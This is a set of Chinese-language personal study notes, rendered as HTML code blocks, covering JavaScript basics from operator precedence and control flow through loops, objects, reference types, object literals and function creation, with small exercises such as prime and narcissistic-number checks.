<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">, 运算符</span><br><span class="line">				  使用 , 可以分割多个语句，一般可以在声明多个变量时使用，</span><br><span class="line">				再JS中有一个运算符优先级的表，</span><br><span class="line">					在表中越靠上的优先级越高，优先级越高优先计算，</span><br><span class="line">					如果优先级一样，从左往右计算</span><br><span class="line">				优先级的表不需要记忆，如果遇到优先级不清楚的</span><br><span class="line">					用()括起来</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; 可以同时声明多个变量并赋值</span><br><span class="line">			&#x2F;&#x2F;var a &#x3D; 1 , b &#x3D; 2 , c &#x3D; 3</span><br><span class="line">			</span><br><span class="line">			&#x2F;* </span><br><span class="line">				如果||的优先级高，或者和两个一样高，应该返回3</span><br><span class="line">				如果&amp;&amp;的优先级高，则应该返回1</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			var result &#x3D; 1 || 2 &amp;&amp; 3;</span><br><span class="line">			alert(result);</span><br></pre></td></tr></table></figure>

<h4 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们的程序是由一条一条的语句构成的</span><br><span class="line">				  语句是按照自上向下的顺序一条一条执行的</span><br><span class="line">				  再JS中可以使用&#123;&#125;来为语句进行分组，</span><br><span class="line">						再同一个&#123;&#125;中的语句我们称为一组语句，</span><br><span class="line">						它要么都执行，要么都不执行。</span><br><span class="line">						一个&#123;&#125;中的语句我们也称为一个代码块</span><br><span class="line">						在代码块的后边也就不用再编写;分号了</span><br><span class="line">				JS中的代码块，只具有分组的作用，没有其他的用处</span><br></pre></td></tr></table></figure>

<h4 id="流程控制语句"><a href="#流程控制语句" class="headerlink" title="流程控制语句"></a>流程控制语句</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line">	流程控制语句</span><br><span class="line">			- JS中的程序是从上到下一行一行执行的</span><br><span class="line">			- 通过流程控制语句可以控制程序执行流程，</span><br><span class="line">				程序可以根据一定的条件来选择执行</span><br><span class="line">			- 语句分类:</span><br><span class="line">				1、条件判断语句</span><br><span class="line">				2、条件分支语句</span><br><span class="line">				3、循环语句</span><br><span class="line">										</span><br><span class="line">	条件判断语句：</span><br><span class="line">		- 使用条件判断语句可以再执行某个语句之前进行判断，</span><br><span class="line">							如果条件成立才会执行，条件不成立语句不执行</span><br><span class="line">		- if语句</span><br><span class="line">		- 语法一:</span><br><span class="line">			if(条件表达式)&#123;</span><br><span class="line">				语句...</span><br><span class="line">			&#125;</span><br><span class="line">							</span><br><span class="line">		if语句只能控制紧随其后的那个语句</span><br><span class="line">			如果希望if语句可以控制多条语句，</span><br><span class="line">			可以将这些语句统一放到代码块中。</span><br><span class="line">		if语句后的代码块不是必须的，但是再开发中最好写上代码块，</span><br><span class="line">			即使代码块只有一条</span><br><span class="line">			</span><br><span class="line">*&#x2F;</span><br><span class="line">var a &#x3D; 15;</span><br><span class="line">	if (a &gt; 10 &amp;&amp; a &lt;&#x3D; 20 )&#123;</span><br><span class="line">		alert(&quot;劳资大于10，但是劳资小于等于20&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if else 语句</span><br><span class="line">					if(条件表达式)&#123;</span><br><span class="line">						语句...</span><br><span class="line">					&#125;</span><br><span class="line">					else&#123;</span><br><span class="line">						语句...</span><br><span class="line">					&#125;</span><br><span class="line">				if...else...语句</span><br><span class="line">					当该语句执行时，会先对if后的条件表达式进行判断</span><br><span class="line">						如果成立执行if后的语句</span><br><span class="line">						如果不成立执行else后面的语句</span><br><span class="line">						</span><br><span class="line">				if(条件表达式)&#123;</span><br><span class="line">					语句...</span><br><span class="line">				&#125;</span><br><span class="line">				else if(条件表达式)&#123;</span><br><span class="line">					语句...</span><br><span class="line">				&#125;</span><br><span class="line">				else if(条件表达式)&#123;</span><br><span class="line">					语句...</span><br><span class="line">				&#125;</span><br><span class="line">				else&#123;</span><br><span class="line">					语句...</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">if...else if...else</span><br><span class="line">				当该语句执行时，会从上到下依次对条件表达式进行求值判断</span><br><span class="line">				如果值为true，则执行当前语句。</span><br><span class="line">				如果值为false，则继续向下判断。</span><br><span class="line">				如果条件都不满足，执行else语句</span><br><span class="line">	语句块中，只会有一个代码块被执行，一旦代码块执行了，则直接结束判断</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			 age &#x3D; 19;</span><br><span class="line">			 if(age &gt; 80)&#123;</span><br><span class="line">				 alert(&quot;你快完了&quot;);</span><br><span class="line">			 &#125;else if(age&gt;60)&#123;</span><br><span class="line">				 alert(&quot;你不应该工作了&quot;);</span><br><span class="line">			 &#125;else if(age&gt;30)&#123;</span><br><span class="line">				 alert(&quot;你已经中年了&quot;);</span><br><span class="line">			 &#125;else if(age &gt;17)&#123;</span><br><span class="line">				 alert(&quot;你已经成年了&quot;);</span><br><span class="line">			 &#125;else&#123;</span><br><span class="line">				 alert(&quot;你未成年&quot;);</span><br><span class="line">			 &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1581858377627.png" alt="1581858377627"></p>
<h4 id="switch…case…default"><a href="#switch…case…default" class="headerlink" title="switch…case…default"></a>switch…case…default</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">	switch(变量)&#123;</span><br><span class="line">		case 表达式：</span><br><span class="line">			语句....</span><br><span class="line">			break</span><br><span class="line">		case 表达式:	</span><br><span class="line">			语句....</span><br><span class="line">			break</span><br><span class="line">			......</span><br><span class="line">		default:</span><br><span class="line">			语句....</span><br><span class="line">			break</span><br><span class="line">&#125;</span><br><span class="line">			 </span><br><span class="line"></span><br><span class="line">执行流程:</span><br><span class="line">		switch ... case ... 语句</span><br><span class="line">		在执行时会依次将case后的表达式的值和switch后的条件表达式的值进行全等比较</span><br><span class="line">			如果比较结果为true，则从当前case处开始执行代码</span><br><span class="line">				当前case后的所有的代码都会执行，我们可以在case的后边跟一个break关键字，</span><br><span class="line">					这样可以确保只会执行当前case后的语句，而不会执行其他的case</span><br><span class="line">		如果比较结果为false，则继续向下比较</span><br><span class="line">		如果所有比较都为false，则只执行default后的语句</span><br><span class="line">					</span><br><span class="line">		switch语句和if语句的功能实际上有重复的，使用switch可以实现if的功能</span><br><span class="line">			同样使用if也可以实现switch的功能，所以我们在使用时根据自己的习惯选择</span><br><span class="line"></span><br><span class="line">num &#x3D; 3;</span><br><span class="line">switch(num)&#123;</span><br><span class="line">	case 1:</span><br><span class="line">	alert(&quot;111&quot;);</span><br><span class="line">	break;</span><br><span class="line">case 2:</span><br><span class="line">	alert(&quot;222&quot;);</span><br><span class="line">	break;</span><br><span class="line">case 3:</span><br><span class="line">	alert(&quot;333&quot;);</span><br><span class="line">	break;</span><br><span class="line">default:</span><br><span class="line">	alert(&quot;非法数字&quot;);</span><br><span class="line">	break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">向页面中输出连续的数字	&lt;br &#x2F;&gt;是在网页中换行</span><br><span class="line">				</span><br><span class="line">				</span><br><span class="line">				循环语句：</span><br><span class="line">				  通过循环语句可以反复的执行一段代码多次</span><br><span class="line">				  </span><br><span class="line">				while循环</span><br><span class="line">				  - 语法:</span><br><span class="line">						whitle(条件表达式)&#123;</span><br><span class="line">							语句...</span><br><span class="line">						&#125;</span><br><span class="line">				- while语句再执行时，</span><br><span class="line">					先对条件表达式进行判断，如果为true，执行循环体，</span><br><span class="line">						第一次循环完毕后，在进行判断，如果还为true，则继续循环u</span><br><span class="line">					如果为false，终止循环</span><br><span class="line">					</span><br><span class="line">				do...while循环</span><br><span class="line">					- 语法:</span><br><span class="line">						do&#123;</span><br><span class="line">							语句...</span><br><span class="line">						&#125;while(条件表达式)</span><br><span class="line">				 - 执行流程</span><br><span class="line">					do...whlie语句在执行时，会先执行循环体，</span><br><span class="line">						循环体执行完毕后，在对while后的条件表达式进行判断</span><br><span class="line">						如果结果为true，则继续执行循环体，执行完毕继续判断一次类推</span><br><span class="line">						如果结果为false，则终止循环</span><br><span class="line">					两个语句的功能类似，不同的是while是先判断后执行，</span><br><span class="line">						do...while是先执行后判断</span><br><span class="line">					do...while可以保证循环体至少执行一次，</span><br><span class="line">						而while不能</span><br><span class="line">			</span><br><span class="line">			 var n &#x3D; 6;</span><br><span class="line">			while(n&gt;1)&#123;</span><br><span class="line">				alert(n);</span><br><span class="line">				n--;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">	var count &#x3D; 0;</span><br><span class="line">	var money &#x3D; 1000;</span><br><span class="line">	while(money&lt;&#x3D;5000)&#123;</span><br><span class="line">		money *&#x3D; 1.05;</span><br><span class="line">		count++;</span><br><span class="line">	&#125;</span><br><span class="line">			</span><br><span class="line">输入期末成绩，等于一百奖励一辆BWM,80-99奖励iPhone，60-80奖励一本书,其他什么奖励也没有</span><br><span class="line">while(true)&#123;</span><br><span class="line">			 var result &#x3D; prompt(&quot;请输入成绩:&quot;);</span><br><span class="line">			 if(result&gt;&#x3D;0 &amp;&amp; result&lt;&#x3D;100)&#123;</span><br><span class="line">				 break</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			if(result&gt;&#x3D;60 &amp;&amp; result&lt;&#x3D;80)&#123;</span><br><span class="line">				alert(&quot;奖励一本书&quot;);</span><br><span class="line">			&#125;else if(result&gt;80 &amp;&amp; result&lt;99)&#123;</span><br><span class="line">				alert(&quot;奖励一台iphone&quot;);</span><br><span class="line">			&#125;else if(result &#x3D;&#x3D; 100)&#123;</span><br><span class="line">				alert(&quot;奖励一辆BWM&quot;);</span><br><span class="line">			&#125;else&#123;</span><br><span class="line">				alert(&quot;什么奖励也没有&quot;);</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<h4 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	for循环的语法:</span><br><span class="line">					for(初始化表达式;条件表达式;更新表达式)&#123;</span><br><span class="line">						语句...</span><br><span class="line">					&#125;</span><br><span class="line">				</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			&#x2F;* result &#x3D; 0</span><br><span class="line">			sum &#x3D; 0;</span><br><span class="line">			for(n &#x3D; 1;n&lt;&#x3D;100;n++)&#123;</span><br><span class="line">				if(n%7 &#x3D;&#x3D;0)&#123;</span><br><span class="line">					sum &#x3D; sum+n;</span><br><span class="line">					result++</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">			&#125;document.write(sum+&quot;&lt;br &#x2F;&gt;&quot;);</span><br><span class="line">			document.write(result+&quot;&lt;br &#x2F;&gt;&quot;); *&#x2F;</span><br><span class="line">		</span><br><span class="line">		&#x2F;&#x2F;求水仙花数</span><br><span class="line">			&#x2F;&#x2F;打印所有的三位数</span><br><span class="line">			for(var i &#x3D; 100; i&lt;1000;i++)&#123;</span><br><span class="line">				&#x2F;&#x2F;获取百位数</span><br><span class="line">				var bai &#x3D; parseInt(i&#x2F;100);</span><br><span class="line">				&#x2F;&#x2F;获取十位数</span><br><span class="line">				var shi &#x3D; parseInt((i-bai*100)&#x2F;10);</span><br><span class="line">				&#x2F;&#x2F;获取个位数</span><br><span class="line">				var ge &#x3D; (i%10);</span><br><span class="line">				&#x2F;&#x2F;判断i是否是水仙花数</span><br><span class="line">				if(bai*bai*bai+shi*shi*shi+ge*ge*ge &#x3D;&#x3D; i)&#123;</span><br><span class="line">				document.write(i+&quot;&lt;br &#x2F;&gt;&quot;);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">在页面输入数字，判断是否是质数</span><br><span class="line">var num &#x3D; prompt(&quot;请输入一个质数数字:&quot;)</span><br><span class="line">			if(num&lt;&#x3D;1)&#123;</span><br><span class="line">				alert(&quot;该值不合法&quot;);</span><br><span class="line">			&#125;else&#123;</span><br><span class="line">				falg &#x3D; true</span><br><span class="line">				for(var i &#x3D; 2;i&lt;num;i++)&#123;</span><br><span class="line">					if(num % i &#x3D;&#x3D;0)&#123;</span><br><span class="line">						falg&#x3D;false;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			if(falg)&#123;</span><br><span class="line">				alert(num+&quot;是质数&quot;);</span><br><span class="line">			&#125;else&#123;</span><br><span class="line">				alert(&quot;不是质数&quot;)</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">乘法表</span><br><span class="line"></span><br><span class="line">for(a&#x3D;1;a&lt;&#x3D;9;a++)&#123;</span><br><span class="line">					</span><br><span class="line">					</span><br><span class="line">					for(i&#x3D;1;i&lt;&#x3D;a;i++)&#123;</span><br><span class="line">						document.write(i+&quot;*&quot;+a+&quot;&#x3D;&quot;+i*a+&quot;&amp;nbsp;&amp;nbsp;&quot;);</span><br><span class="line">					&#125;document.write(&quot;&lt;br &#x2F;&gt;&quot;);</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">打印2-100之间的所有数</span><br><span class="line">				for(var i &#x3D; 2 ; i &lt;&#x3D;100;i++)&#123;</span><br><span class="line">						&#x2F;&#x2F; 创建一个布尔值，用来保存结果，默认i是质数</span><br><span class="line">						var falg &#x3D; true</span><br><span class="line">					&#x2F;&#x2F; 判断i是否是质数</span><br><span class="line">					&#x2F;&#x2F; 获取到2-i之间的所有数</span><br><span class="line">					for(var j&#x3D;2; j&lt;i;j++)&#123;</span><br><span class="line">						&#x2F;&#x2F; 判断i是否能被j整除</span><br><span class="line">						if(i%j&#x3D;&#x3D;0)&#123;</span><br><span class="line">						&#x2F;&#x2F; 如果进入判断则整明i不是质数，修改falg值为false</span><br><span class="line">						falg&#x3D;false;</span><br><span class="line">						&#125;</span><br><span class="line">						</span><br><span class="line">					&#125;</span><br><span class="line">					&#x2F;&#x2F; 如果是质数，则打印i的值</span><br><span class="line">					if(falg)&#123;</span><br><span class="line">						document.write(i+&quot;&amp;nbsp&quot;);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br></pre></td></tr></table></figure>

<h4 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line">				break关键字可以用来退出switch或循环语句</span><br><span class="line">				  不能在if语句中使用break和continue</span><br><span class="line">				  break关键字，会终止离他最近的循环</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			for(i &#x3D; 1; i&lt;&#x3D;5;i++)&#123;</span><br><span class="line">				document.write(i+&quot;&amp;nbsp&quot;);</span><br><span class="line">				if(i &#x3D;&#x3D; 4)&#123;</span><br><span class="line">					break</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			&#x2F;* continue关键字可以用来跳过当次循环</span><br><span class="line">				  同样continue也是默认只会对最近的循环其作用</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			for(i &#x3D; 1; i&lt;&#x3D;5;i++)&#123;</span><br><span class="line">				document.write(i+&quot;&amp;nbsp&quot;);</span><br><span class="line">				if(i &#x3D;&#x3D; 4)&#123;</span><br><span class="line">					continue</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<h4 id="对象的基本操作"><a href="#对象的基本操作" class="headerlink" title="对象的基本操作"></a>对象的基本操作</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JS数据类型</span><br><span class="line">		- String 字符串</span><br><span class="line">		- Number 数值</span><br><span class="line">		- Boolean 布尔型</span><br><span class="line">		- Null 空</span><br><span class="line">		- undefined 未定义</span><br><span class="line">			- 以上这五种类型属于基本数据类型，如果我们看到的值</span><br><span class="line">				只要不是上面的5中，全都都是对象</span><br><span class="line">		- Object 对象</span><br><span class="line">		</span><br><span class="line">	基本数据类型都是单一的值&quot;hellp&quot; 123 true，</span><br><span class="line">		值和值之间没有任何的联系。</span><br><span class="line">		</span><br><span class="line">	在JS中标识一个人的信息(name gender age)</span><br><span class="line">		var name &#x3D; &quot;孙悟空&quot;;</span><br><span class="line">		var gender &#x3D; &quot;男&quot;;</span><br><span class="line">		var age &#x3D; 18;</span><br><span class="line">	如果使用基本数据类型的数据，我们所创建的变量都是独立的，不能成为一个整体</span><br><span class="line">	</span><br><span class="line">	对象的分类:</span><br><span class="line">		1、内建对象</span><br><span class="line">			- 由ES标准中定义的对象，在任何的ES的实现中都可以使用</span><br><span class="line">			- 比如，Math String Number Boolean Function Object....</span><br><span class="line">			</span><br><span class="line">		2、宿主对象</span><br><span class="line">			- 由JS的运行环境提供的对象，目前来讲主要由浏览器提供的对象</span><br><span class="line">			- 比如 BOM DOM</span><br><span class="line">			</span><br><span class="line">		3、自定义对象</span><br><span class="line">			- 由开发人员自己创建的对象</span><br><span class="line"></span><br><span class="line">			 &#x2F;&#x2F;创建对象</span><br><span class="line">			 </span><br><span class="line">			 使用new关键字调用的函数，是构造函数constructor</span><br><span class="line">				构造函数时专门用来创建对象的函数</span><br><span class="line">			使用typeof检查一个对象时，返回object</span><br><span class="line">		</span><br><span class="line">		var obj &#x3D; new Object();</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">			在对象中保存的值成为属性</span><br><span class="line">			向对象添加属性</span><br><span class="line">				语法:对象.属性名 &#x3D; 属性值;</span><br><span class="line">				</span><br><span class="line">			如果读取对象中没有属性，不会报错而是返回undefined</span><br><span class="line">		</span><br><span class="line">		&#x2F;&#x2F; 向obj中添加一个name属性</span><br><span class="line">		obj.name &#x3D; &quot;孙悟空&quot;;</span><br><span class="line">		&#x2F;&#x2F; 向obj中添加一个gender属性</span><br><span class="line">		obj.gender &#x3D; &quot;男&quot;;</span><br><span class="line">		obj.age &#x3D; 18;</span><br><span class="line">		</span><br><span class="line">			读取对象中的属性</span><br><span class="line">				语法: 对象.属性名</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F;document.write(obj.gender);</span><br><span class="line">		</span><br><span class="line">			修改对象的属性值</span><br><span class="line">				语法: 对象.属性名 &#x3D; 新值</span><br><span class="line"></span><br><span class="line">		obj.name &#x3D; &quot;齐天大圣&quot;</span><br><span class="line">		 document.write(obj.name);</span><br><span class="line"></span><br><span class="line">			删除对象属性</span><br><span class="line">				语法：delete 对象.属性名</span><br><span class="line"></span><br><span class="line">		delete obj.name;</span><br><span class="line">		document.write(obj.name);</span><br></pre></td></tr></table></figure>

<h4 id="属性名和属性值"><a href="#属性名和属性值" class="headerlink" title="属性名和属性值"></a>属性名和属性值</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">向对象中添加属性</span><br><span class="line">				  - 对象的属性名不强制要求遵守标识符的规范</span><br><span class="line">						什么乱七八糟的名字都可以使用</span><br><span class="line">				- 但是在使用的时候最好还是按照标识符的规范去做</span><br><span class="line"></span><br><span class="line">			obj.name &#x3D; &quot;孙悟空&quot;</span><br><span class="line">			 </span><br><span class="line">				如果要使用特殊的属性名，不能采用.的方式来操作</span><br><span class="line">					需要时用另一种方式：</span><br><span class="line">						语法：对象[&quot;属性名&quot;] &#x3D; 属性值	</span><br><span class="line">						读取时也要采用这种方式</span><br><span class="line">				</span><br><span class="line">				使用[]这种形式去操作属性，更加的灵活，</span><br><span class="line">				  在[]中可以直接传递一个变量，这样变量值时多少就会读取那个属性</span><br><span class="line"></span><br><span class="line">			obj[&quot;123&quot;] &#x3D; 456;</span><br><span class="line">			obj[&quot;nihao&quot;] &#x3D; &quot;你好&quot;</span><br><span class="line">			var a &#x3D; &quot;nihao&quot;</span><br><span class="line">			document.write(obj[a]);</span><br><span class="line">			 </span><br><span class="line">				属性值</span><br><span class="line">					JS对象的属性值，可以是任意的数据类型</span><br><span class="line">						是指也可以是一个对象</span><br><span class="line">			</span><br><span class="line">			obj.text &#x3D; true;</span><br><span class="line">			document.write(obj.text);</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; 创建一个对象</span><br><span class="line">			var obj2 &#x3D; new Object(); </span><br><span class="line">			obj2.name &#x3D; &quot;猪八戒&quot;</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; 将obj2设置为obj属性</span><br><span class="line">			obj.test &#x3D; obj2;</span><br><span class="line">			document.write(obj.test.name);</span><br><span class="line">			</span><br><span class="line">				in运算符</span><br><span class="line">				  - 通过该运算符可以检查一个对象中是否含有指定的属性</span><br><span class="line">						如果有则返回true，没有返回false</span><br><span class="line">						</span><br><span class="line">				语法：</span><br><span class="line">					&quot;属性名&quot; in 对象</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; 价差obj中是否含有obj2这个属性</span><br><span class="line">			&#x2F;&#x2F; document.write(&quot;test2&quot; in obj);</span><br><span class="line">			&#x2F;&#x2F; document.write(&quot;test&quot; in obj);</span><br><span class="line">			document.write(&quot;name&quot; in obj);</span><br></pre></td></tr></table></figure>

<h4 id="基本和引用数据类型"><a href="#基本和引用数据类型" class="headerlink" title="基本和引用数据类型"></a>基本和引用数据类型</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">基本数据类型</span><br><span class="line">	String Number Boolean Null undefined </span><br><span class="line">				</span><br><span class="line">引用数据类型</span><br><span class="line">	Object</span><br><span class="line">	JS中的变量都是保存到栈内存中的，</span><br><span class="line">		基本数据类型的值直接在栈内存中存储，</span><br><span class="line">		值与值之间是独立存在，修改一个变量不会影响其他的变量</span><br><span class="line">					</span><br><span class="line">		对象是保存到堆内存的，每创建一个新的对象，就会在堆内存中开辟出一个新的空间</span><br><span class="line">		而变量保存的是对象的内存地址(对象的引用),如果两个变量保存的是同一个对象引用，</span><br><span class="line">		当一个通过一个变量修改属性时，另一个也会受到影响</span><br><span class="line">					</span><br><span class="line">var a &#x3D; 123;</span><br><span class="line">var b &#x3D; a;</span><br><span class="line">a++;</span><br><span class="line">			</span><br><span class="line">&#x2F;&#x2F; a和b的两个值是完全独立的，一个值的变化并不会影响另一个值</span><br><span class="line">	document.write(&quot;a &#x3D; &quot;+ a); 	&#x2F;&#x2F; 124</span><br><span class="line">	document.write(&quot;b &#x3D; &quot;+ b);	&#x2F;&#x2F; 123 </span><br><span class="line">		   </span><br><span class="line">&#x2F;&#x2F; 修改一个值后，另一个值也跟着变化</span><br><span class="line">	var obj &#x3D; new Object();</span><br><span class="line">	obj.name &#x3D; &quot;孙悟空&quot;;</span><br><span class="line">		   </span><br><span class="line">	var obj2 &#x3D; obj;</span><br><span class="line">		   </span><br><span class="line">&#x2F;&#x2F; 修改obj的name属性</span><br><span class="line">	obj.name &#x3D; &quot;唐僧&quot;</span><br><span class="line">	document.write(obj.name);</span><br><span class="line">	document.write(obj2.name); </span><br><span class="line">		   </span><br><span class="line">&#x2F;&#x2F; 设置obj2为null</span><br><span class="line">&#x2F;&#x2F; 当修改变量的值的时候，对其它对象没有影响</span><br><span class="line">	obj2 &#x3D; null;</span><br><span class="line">	document.write(obj);</span><br><span class="line">	document.write(obj2);</span><br><span class="line">		  </span><br><span class="line">	var obj3 &#x3D; new Object();</span><br><span class="line">	var obj4 &#x3D; new Object();</span><br><span class="line">	obj3.name &#x3D; &quot;沙和尚&quot;;</span><br><span class="line">	obj4.name &#x3D; &quot;沙和尚&quot;;</span><br><span class="line">	document.write(obj3.name);</span><br><span class="line">	document.write(obj4.name);</span><br><span class="line">	document.write(obj3 &#x3D;&#x3D; obj4); </span><br><span class="line">		   </span><br><span class="line">当比较两个基本数据类型的值时，就是比较值。</span><br><span class="line">	而比较两个引用数据类型时，他是比较的对象的内存地址，</span><br><span class="line">	如果两个对象是一模一样的，但是地址不同，他也会返回false</span><br></pre></td></tr></table></figure>

<h4 id="对象字面量"><a href="#对象字面量" class="headerlink" title="对象字面量"></a>对象字面量</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 创建一个对象</span><br><span class="line">			&#x2F;&#x2F; var obj &#x3D; new Object();</span><br><span class="line">			&#x2F;* </span><br><span class="line">				使用对象字面量来创建一个对象</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; 使用&#123;&#125;大括号创建对象和new Object()是一样的</span><br><span class="line">			&#x2F;&#x2F; 使用&#123;&#125;大括号更加方便</span><br><span class="line">			var obj &#x3D; &#123;&#125;;</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F;document.write(obj);</span><br><span class="line">			obj.name &#x3D; &quot;Sun&quot;</span><br><span class="line">			&#x2F;&#x2F;document.write(obj.name);</span><br><span class="line">			&#x2F;* </span><br><span class="line">				使用对象字面量可以在创建对象时，直接指定对象中的属性</span><br><span class="line">				语法：&#123;属性名:属性值,属性名:属性值......&#125;</span><br><span class="line">					对象字面量的属性名可以加引号也可以不加，建议不加，</span><br><span class="line">					如果使用一些特殊的属性名，必须加引号</span><br><span class="line">					例如:&quot;@!#!@$&quot;</span><br><span class="line">					</span><br><span class="line">				属性名和属性值是一组一组的名值对结构,</span><br><span class="line">					名和值之间使用 &quot;:&quot; 冒号连接，多个名值对之间使用 &quot;,&quot; 逗号隔开</span><br><span class="line">					如果只有一个属性，不跟其他属性就不要写 &quot;,&quot; 逗号了</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			&#x2F;&#x2F; 创建了一个对象，同时为这个对象添加了一个属性</span><br><span class="line">			&#x2F;&#x2F; 属性的名字叫name，属性的值叫做 &quot;猪八戒&quot;</span><br><span class="line">			&#x2F;&#x2F; 可以创建多个属性</span><br><span class="line">			var obj2 &#x3D; &#123;</span><br><span class="line">				name:&quot;猪八戒&quot;,</span><br><span class="line">				age:28,</span><br><span class="line">				&#125;;</span><br><span class="line">			&#x2F;&#x2F; 在页面输出</span><br><span class="line">			document.write(obj2.name,obj2.age);</span><br></pre></td></tr></table></figure>

<h4 id="函数的介绍"><a href="#函数的介绍" class="headerlink" title="函数的介绍"></a>函数的介绍</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line">				函数</span><br><span class="line">					- 函数也是一个对象</span><br><span class="line">					- 函数中可以封装一些功能(代码)，在需要时可以执行这些功能(代码)</span><br><span class="line">					- 函数中可以保存一些代码在需要的时候调用</span><br><span class="line">					- 使用typeof检查一个函数对象时，会返回function</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			&#x2F;* </span><br><span class="line">				不使用这种构造函数</span><br><span class="line">			&#x2F;&#x2F; 在实际开发中很少使用构造函数对象</span><br><span class="line">			&#x2F;&#x2F; 创建一个函数对象</span><br><span class="line">			&#x2F;&#x2F; 可以将要封装的代码以字符串的形式传递给构造函数</span><br><span class="line">			&#x2F;&#x2F; var fun &#x3D; new Function(&quot;document.write(&#39;Hello 这是我的第一个函数&#39;);&quot;);</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; 封装到函数中的代码不会立即执行</span><br><span class="line">			&#x2F;&#x2F; 函数中的代码会在函数调用的时候执行</span><br><span class="line">			&#x2F;&#x2F; 调用函数语法，函数对象()</span><br><span class="line">			&#x2F;&#x2F; 当调用函数时，函数中封装的代码会按照顺序执行</span><br><span class="line">			&#x2F;&#x2F; fun();</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; document.write(typeof fun);</span><br><span class="line">			&#x2F;&#x2F; document.write(fun); *&#x2F;</span><br><span class="line">			</span><br><span class="line">			&#x2F;* </span><br><span class="line">				使用函数声明来创建一个函数</span><br><span class="line">				  语法:</span><br><span class="line">					function 函数名([形参1,形参2...形参N])&#123;</span><br><span class="line">							语句....</span><br><span class="line">					&#125;</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			function fun2()&#123;</span><br><span class="line">				document.write(&quot;这是我的第二个函数&quot;);</span><br><span class="line">				alert(&quot;哈哈哈哈&quot;);</span><br><span class="line">				console.log(&quot;&#x2F;(ㄒoㄒ)&#x2F;~~&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; 调用fun2 </span><br><span class="line">			&#x2F;&#x2F; fun2();</span><br><span class="line">			</span><br><span class="line">			&#x2F;* </span><br><span class="line">				使用函数表达式来创建一个函数</span><br><span class="line">				var 函数名 &#x3D; function([形参1,形参2...形参N])&#123;</span><br><span class="line">					语句...</span><br><span class="line">				&#125;</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			var fun3 &#x3D; function()&#123;</span><br><span class="line">				document.write(&quot;匿名函数&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">			fun3();</span><br></pre></td></tr></table></figure>

